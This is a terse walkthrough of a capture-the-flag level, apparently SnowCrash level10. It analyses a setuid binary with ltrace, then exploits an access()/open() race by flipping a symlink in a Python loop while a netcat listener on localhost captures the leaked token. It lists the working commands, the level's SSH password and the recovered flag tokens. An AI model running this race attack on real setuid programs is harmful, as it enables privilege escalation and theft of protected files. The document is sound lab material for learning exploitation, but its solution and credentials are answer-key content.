+ ---- ðŸ”» Analyze ----
|
|   ./level10 token http://localhost
|   ltrace ./level10 token http://localhost
|   ðŸ‘‰ access("token", 4)
|   man 2 access
|   ðŸ‘‰ NOTES ðŸŒŸ Warning:  Using  access() ...
|


+ ---- ðŸ”» Network ----
|
|   ðŸŒŸ https://ru.wikipedia.org/wiki/Netcat
|   nc -lk 6969 > /tmp/output &
|
|   curl http://localhost:6969
|   ctrl+c
|   ðŸ‘‰ cat /tmp/output
|
|   echo token_test > /tmp/foo
|   ./level10 /tmp/foo 127.0.0.1
|   ðŸ‘‰ cat /tmp/output
|   kill %1
|


+ ---- ðŸ”» Before hack ----
|
|   echo token_test > /tmp/foo
|   ln -sf /tmp/foo /tmp/sym
|   ls -la /tmp/sym
|
|   ln -sf /home/user/level10/token /tmp/sym
|   ls -la /tmp/sym
|
|   ðŸŒŸ python_one_line src: https://stackoverflow.com/a/35651859
|   python -c $'import os\nimport time\nwhile True:\n\tprint("ok")\n\ttime.sleep(1)\n'
|


+ ---- ðŸ”» Hack ----
|
|   ssh level10@$SNOW_CRASH_IP -p 4242
|   â”” s5cAJpM8ev6XHw998pRWG728z
|   echo token_test > /tmp/foo
|   rm -f /tmp/output; nc -lk 6969 > /tmp/output &
|   ðŸ‘‰ [1] xxxxx
|   python -c $'import os\nwhile True:\n\tos.system("ln -sf {} {}".format("/tmp/foo", "/tmp/sym"))\n\tos.system("ln -sf {} {}".format("/home/user/level10/token", "/tmp/sym"))' &
|   ðŸ‘‰ [2] xxxxx
|   python -c $'import os\nfor _ in range(100):\n\tos.system("./level10 /tmp/sym 127.0.0.1")'; cat /tmp/output
|   kill %1; kill %2
|   ðŸ‘‰ woupa2yuojeeaaed06riuj63c
|   su flag10
|   â”” woupa2yuojeeaaed06riuj63c
|   getflag
|   ðŸ‘‰ Check flag.Here is your token : feulo4b72j7edeahuete3no7c
|
